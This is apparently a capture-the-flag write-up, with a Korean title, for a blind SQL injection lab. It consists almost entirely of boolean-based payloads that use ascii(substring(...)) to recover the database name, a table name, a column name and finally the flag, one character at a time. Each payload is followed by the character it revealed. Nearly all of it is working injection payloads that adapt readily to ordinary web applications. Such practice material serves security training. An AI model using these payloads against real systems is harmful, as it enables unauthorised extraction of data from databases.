# DB 데이터 추출 3

mario'+and+(ascii(substring((select+database()),1,1))=115)+and'1'='1
s

mario'+and+(ascii(substring((select+database()),2,1))=115)+and'1'='1
q

mario'+and+(ascii(substring((select+database()),3,1))=108)+and'1'='1
l

mario'+and+(ascii(substring((select+database()),4,1))=105)+and'1'='1
i

mario'+and+(ascii(substring((select+database()),5,1))=95)+and'1'='1
_

mario'+and+(ascii(substring((select+database()),6,1))=51)+and'1'='1
3

mario'+and+(ascii(substring((select+database()),7,1))>0)+and'1'='1
x

db = sqli_3

select table_name from information_schema.tables where table_schema = 'DB이름' limit 0,1 

select table_name from information_schema.tables where table_schema = 'sqli_3' limit 0,1

mario'+and+(ascii(substring((select+table_name+from+information_schema.tables+where+table_schema+=+'sqli_3'+limit+0,1),1,1))=102)+and'1'='1
f

mario'+and+(ascii(substring((select+table_name+from+information_schema.tables+where+table_schema+=+'sqli_3'+limit+0,1),2,1))=108)+and'1'='1
l

mario'+and+(ascii(substring((select+table_name+from+information_schema.tables+where+table_schema+=+'sqli_3'+limit+0,1),3,1))=97)+and'1'='1
a

mario'+and+(ascii(substring((select+table_name+from+information_schema.tables+where+table_schema+=+'sqli_3'+limit+0,1),4,1))=103)+and'1'='1
g

mario'+and+(ascii(substring((select+table_name+from+information_schema.tables+where+table_schema+=+'sqli_3'+limit+0,1),5,1))=95)+and'1'='1
_

mario'+and+(ascii(substring((select+table_name+from+information_schema.tables+where+table_schema+=+'sqli_3'+limit+0,1),6,1))=116)+and'1'='1
t

mario'+and+(ascii(substring((select+table_name+from+information_schema.tables+where+table_schema+=+'sqli_3'+limit+0,1),7,1))=97)+and'1'='1
a

mario'+and+(ascii(substring((select+table_name+from+information_schema.tables+where+table_schema+=+'sqli_3'+limit+0,1),8,1))=98)+and'1'='1
b

mario'+and+(ascii(substring((select+table_name+from+information_schema.tables+where+table_schema+=+'sqli_3'+limit+0,1),9,1))=108)+and'1'='1
l

mario'+and+(ascii(substring((select+table_name+from+information_schema.tables+where+table_schema+=+'sqli_3'+limit+0,1),10,1))=101)+and'1'='1
e

table = flag_table

select column_name from information_schema.columns where table_name='member'

select column_name from information_schema.columns where table_name='flag_table'

mario'+and+(ascii(substring((select column_name from information_schema.columns where table_name='flag_table'),11,1))>0)+and'1'='1


mario'+and+(ascii(substring((select+column_name+from+information_schema.columns+where+table_name='flag_table'),1,1))=102)+and'1'='1
f

mario'+and+(ascii(substring((select+column_name+from+information_schema.columns+where+table_name='flag_table'),2,1))=108)+and'1'='1
l

mario'+and+(ascii(substring((select+column_name+from+information_schema.columns+where+table_name='flag_table'),3,1))=97)+and'1'='1
a

mario'+and+(ascii(substring((select+column_name+from+information_schema.columns+where+table_name='flag_table'),4,1))=103)+and'1'='1
g

column = flag

mario'+and+(ascii(substring((select flag from flag_table),1,1))>0)+and'1'='1

mario'+and+(ascii(substring((select+flag+from+flag_table),1,1))=115)+and'1'='1
s

mario'+and+(ascii(substring((select+flag+from+flag_table),2,1))=101)+and'1'='1
e

mario'+and+(ascii(substring((select+flag+from+flag_table),3,1))=103)+and'1'='1
g

mario'+and+(ascii(substring((select+flag+from+flag_table),4,1))=102)+and'1'='1
f

mario'+and+(ascii(substring((select+flag+from+flag_table),5,1))=97)+and'1'='1
a

mario'+and+(ascii(substring((select+flag+from+flag_table),6,1))=117)+and'1'='1
u

mario'+and+(ascii(substring((select+flag+from+flag_table),7,1))=108)+and'1'='1
l

mario'+and+(ascii(substring((select+flag+from+flag_table),8,1))=116)+and'1'='1
t

mario'+and+(ascii(substring((select+flag+from+flag_table),9,1))=123)+and'1'='1
{

mario'+and+(ascii(substring((select+flag+from+flag_table),10,1))=66)+and'1'='1
B

mario'+and+(ascii(substring((select+flag+from+flag_table),11,1))=108)+and'1'='1
l

mario'+and+(ascii(substring((select+flag+from+flag_table),11,1))=105)+and'1'='1
i

mario'+and+(ascii(substring((select+flag+from+flag_table),13,1))=110)+and'1'='1
n

mario'+and+(ascii(substring((select+flag+from+flag_table),14,1))=100)+and'1'='1
d

mario'+and+(ascii(substring((select+flag+from+flag_table),15,1))=95)+and'1'='1
_

mario'+and+(ascii(substring((select+flag+from+flag_table),16,1))=83)+and'1'='1
S

mario'+and+(ascii(substring((select+flag+from+flag_table),17,1))=81)+and'1'='1
Q

mario'+and+(ascii(substring((select+flag+from+flag_table),18,1))=76)+and'1'='1
L

mario'+and+(ascii(substring((select+flag+from+flag_table),19,1))=105)+and'1'='1
i

mario'+and+(ascii(substring((select+flag+from+flag_table),20,1))=95)+and'1'='1
_

mario'+and+(ascii(substring((select+flag+from+flag_table),21,1))=69)+and'1'='1
E

mario'+and+(ascii(substring((select+flag+from+flag_table),22,1))=65)+and'1'='1
A

mario'+and+(ascii(substring((select+flag+from+flag_table),23,1))=83)+and'1'='1
S

mario'+and+(ascii(substring((select+flag+from+flag_table),24,1))=89)+and'1'='1
Y

mario'+and+(ascii(substring((select+flag+from+flag_table),25,1))=125)+and'1'='1
}

segfault{Blind_SQLi_EASY}